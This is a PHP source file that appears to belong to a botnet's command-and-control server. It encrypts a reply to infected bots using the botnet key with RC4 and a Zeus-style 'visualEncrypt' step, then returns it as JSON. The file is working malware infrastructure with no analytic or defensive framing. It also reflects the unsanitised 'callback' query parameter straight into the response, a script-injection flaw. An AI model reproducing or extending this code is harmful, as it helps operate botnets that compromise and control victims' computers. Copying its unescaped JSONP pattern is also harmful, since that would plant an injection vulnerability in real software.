<?php
require_once(dirname(__FILE__)."/utils.php");
$botnet_cryptkey_bin = rc4Init($botnet_cryptkey);
$replyData = random_bytes(32);
#print $replyData."<BR/>";
$replyData = pack('LL', mt_rand(), strlen($replyData)) . md5($replyData, true) . $replyData;
visualEncrypt($replyData);
rc4($replyData, $botnet_cryptkey_bin);
$result = base64_encode($replyData);
//print $result."<BR/>";
$json_arr = array("ret" => 0, "data" => urlencode($result));
if (isset($_GET['callback'])) {
$callback = $_GET['callback'];
echo $callback . "(". json_encode($json_arr). ")";
}
else {
echo json_encode($json_arr);
}
?>
